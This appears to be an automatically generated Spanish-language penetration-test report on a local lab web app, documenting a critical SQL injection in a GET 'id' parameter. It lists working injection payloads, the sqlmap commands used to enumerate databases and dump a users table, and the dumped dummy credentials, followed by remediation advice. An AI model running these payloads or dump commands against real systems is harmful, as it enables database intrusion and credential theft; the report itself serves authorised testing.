# Informe de Auditoría de Seguridad – SQL Injection
**Fecha:** 2026-04-27 11:56:50  
**Objetivo:** http://web.dev.local:8083  
**Herramienta:** sqlmap 1.10.2  

---

## Resumen Ejecutivo

Se realizó un análisis de seguridad dinámica (DAST) sobre la aplicación web disponible en `http://web.dev.local:8083`. Durante la fase de reconocimiento se identificó un formulario de búsqueda de usuarios con el parámetro GET `id`. Dicho parámetro resultó **altamente vulnerable a SQL Injection**, permitiendo la extracción completa de la base de datos, incluyendo credenciales de usuarios en texto plano. El usuario de base de datos empleado por la aplicación es `root@%`, lo que amplía considerablemente el impacto potencial.

---

## Vectores Analizados

| Método | Parámetro | URL |
|--------|-----------|-----|
| GET    | `id`      | `http://web.dev.local:8083/?id=1&Submit=Submit` |

La aplicación expone un formulario HTML (`<form action="#" method="GET">`) con el campo `id` que es enviado directamente a la base de datos sin sanitización.

---

## Hallazgos

### Vulnerabilidad: SQL Injection en parámetro `id`

**Severidad:** Crítica  
**CVSS estimado:** 9.8 (Critical)  
**DBMS detectado:** MySQL >= 5.1 (MariaDB fork)  
**Sistema operativo:** Linux Debian  
**Tecnologías:** PHP 8.1.33, Apache 2.4.65  

#### Tipos de inyección confirmados por sqlmap

| Tipo | Título | Payload |
|------|--------|---------|
| Boolean-based blind | AND boolean-based blind - WHERE or HAVING clause (subquery - comment) | `id=1' AND 4855=(SELECT (CASE WHEN (4855=4855) THEN 4855 ELSE (SELECT 5578 UNION SELECT 1967) END))-- -&Submit=Submit` |
| Error-based | MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE) | `id=1' AND EXTRACTVALUE(7032,CONCAT(0x5c,0x716a7a7671,(SELECT (ELT(7032=7032,1))),0x716b7a6a71)) AND 'VNQE'='VNQE&Submit=Submit` |
| Time-based blind | MySQL >= 5.0.12 AND time-based blind (query SLEEP) | `id=1' AND (SELECT 8779 FROM (SELECT(SLEEP(5)))fHXT) AND 'DaGw'='DaGw&Submit=Submit` |
| UNION query | Generic UNION query (NULL) - 2 columns | `id=1' UNION ALL SELECT NULL,CONCAT(0x716a7a7671,0x677648566462786877766467765159474a775444736c5a416463474b5574416b48654d424e47426a,0x716b7a6a71)-- -&Submit=Submit` |

#### Comandos sqlmap utilizados

```bash
# Fase 2 - Descubrimiento
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" --batch --level=3 --risk=2 --timeout=30 --retries=2

# Fase 3 - Explotación: usuario actual y bases de datos
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" --batch --timeout=30 --retries=2 --current-user --dbs

# Fase 3 - Explotación: tablas de sqli_demo
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" --batch --timeout=30 --retries=2 -D sqli_demo --tables

# Fase 3 - Explotación: volcado completo de la tabla users
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" --batch --timeout=30 --retries=2 -D sqli_demo -T users --dump
```

---

## Evidencia de Explotación

### Usuario de base de datos
```
current user: 'root@%'
```

### Bases de datos disponibles
```
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli_demo
[*] sys
```

### Tabla `users` – Base de datos `sqli_demo` (volcado completo)

| user_id | username  | first_name | last_name | email               | password    |
|---------|-----------|------------|-----------|---------------------|-------------|
| 1       | admin     | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith    | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson  | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown    | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis    | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller   | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson   | Frank      | Wilson    | frank@example.com   | admin123    |

Las contraseñas se almacenan en **texto plano**, sin ningún tipo de hashing, lo que agrava aún más la criticidad del hallazgo.

---

## Conclusión

La aplicación web en `http://web.dev.local:8083` presenta una vulnerabilidad crítica de **SQL Injection** en el parámetro GET `id`. La explotación fue exitosa y permitió:

1. **Identificar el motor de base de datos** (MySQL/MariaDB) y credenciales de acceso del servicio (`root@%`).
2. **Enumerar todas las bases de datos** del servidor (5 bases de datos, incluyendo `mysql` del sistema).
3. **Volcar la tabla de usuarios** con credenciales en texto plano (8 usuarios, incluyendo `admin`).

### Recomendaciones

- **Usar consultas parametrizadas (prepared statements)** para eliminar la posibilidad de inyección SQL.
- **Hashear las contraseñas** con algoritmos seguros (bcrypt, Argon2) en lugar de almacenarlas en texto plano.
- **Aplicar el principio de mínimo privilegio** en la base de datos: la aplicación no debe ejecutarse como `root`.
- **Implementar WAF** (Web Application Firewall) como capa adicional de protección.
- **Validar y sanitizar** todos los inputs del usuario en el lado del servidor.

---

*Informe generado automáticamente por Agente DAST – Entorno de laboratorio autorizado.*
